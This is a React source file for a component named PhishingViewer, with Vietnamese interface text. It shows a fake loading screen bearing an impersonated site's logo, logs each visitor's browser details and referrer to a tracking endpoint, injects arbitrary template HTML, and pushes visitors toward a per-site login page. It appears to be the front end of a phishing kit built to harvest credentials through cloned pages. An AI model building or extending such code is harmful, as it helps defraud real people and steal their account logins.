import { useState, useEffect, useCallback } from 'react';
import './PhishingViewer.css';

const PhishingViewer = ({ 
  website, 
  templateContent, 
  onNavigateToLogin 
}) => {
  const [isLoading, setIsLoading] = useState(true);
  const [isTransitioning, setIsTransitioning] = useState(false);
  const [loadingProgress, setLoadingProgress] = useState(0);

  useEffect(() => {
    // Simulate loading progress
    const progressInterval = setInterval(() => {
      setLoadingProgress(prev => {
        if (prev >= 100) {
          clearInterval(progressInterval);
          setTimeout(() => setIsLoading(false), 300);
          return 100;
        }
        return prev + Math.random() * 15;
      });
    }, 100);

    // Track page view
    trackPageView();

    return () => clearInterval(progressInterval);
  }, [trackPageView]);

  const trackPageView = useCallback(async () => {
    try {
      await fetch('/api/track-view', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          slug: website.slug,
          userAgent: navigator.userAgent,
          referrer: document.referrer,
          timestamp: new Date().toISOString()
        })
      });
    } catch (err) {
      console.log('Tracking failed:', err);
    }
  }, [website.slug]);

  const handleLoginClick = useCallback(() => {
    setIsTransitioning(true);
    
    // Add smooth transition effect
    setTimeout(() => {
      if (onNavigateToLogin) {
        onNavigateToLogin();
      } else {
        window.location.href = `/login/${website.slug}`;
      }
    }, 800);
  }, [onNavigateToLogin, website.slug]);

  // Make Login function globally available
  useEffect(() => {
    window.Login = handleLoginClick;
    return () => {
      delete window.Login;
    };
  }, [handleLoginClick]);

  if (isLoading) {
    return (
      <div className="phishing-loader">
        <div className="loader-container">
          <div className="loader-logo">
            {website.thumbnail ? (
              <img src={website.thumbnail} alt={website.title} />
            ) : (
              <div className="default-logo">
                <div className="logo-icon"></div>
              </div>
            )}
          </div>
          
          <div className="loader-content">
            <h2>{website.title || 'Loading...'}</h2>
            <div className="progress-bar">
              <div 
                className="progress-fill" 
                style={{ width: `${loadingProgress}%` }}
              ></div>
            </div>
            <p className="loading-text">
              {loadingProgress < 30 && 'Đang kết nối...'}
              {loadingProgress >= 30 && loadingProgress < 60 && 'Đang tải dữ liệu...'}
              {loadingProgress >= 60 && loadingProgress < 90 && 'Đang xử lý...'}
              {loadingProgress >= 90 && 'Hoàn thành!'}
            </p>
          </div>
        </div>
        
        <div className="loader-background">
          <div className="floating-particles">
            {[...Array(20)].map((_, i) => (
              <div key={i} className="particle" style={{
                left: `${Math.random() * 100}%`,
                animationDelay: `${Math.random() * 3}s`,
                animationDuration: `${3 + Math.random() * 2}s`
              }}></div>
            ))}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className={`phishing-container ${isTransitioning ? 'transitioning' : ''}`}>
      {/* Transition overlay */}
      {isTransitioning && (
        <div className="transition-overlay">
          <div className="transition-content">
            <div className="transition-spinner"></div>
            <p>Đang chuyển hướng đến trang đăng nhập...</p>
          </div>
        </div>
      )}
      
      {/* Main content */}
      <div className="phishing-content">
        <div 
          className="template-content"
          dangerouslySetInnerHTML={{ __html: templateContent }}
        />
      </div>
      
      {/* Floating action button for login (if no login button in template) */}
      <button 
        className="floating-login-btn"
        onClick={handleLoginClick}
        title="Đăng nhập"
      >
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
          <path d="M15 3H19C19.5304 3 20.0391 3.21071 20.4142 3.58579C20.7893 3.96086 21 4.46957 21 5V19C21 19.5304 20.7893 20.0391 20.4142 20.4142C20.0391 20.7893 19.5304 21 19 21H15" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
          <path d="M10 17L15 12L10 7" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
          <path d="M15 12H3" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
        </svg>
      </button>
    </div>
  );
};

export default PhishingViewer;
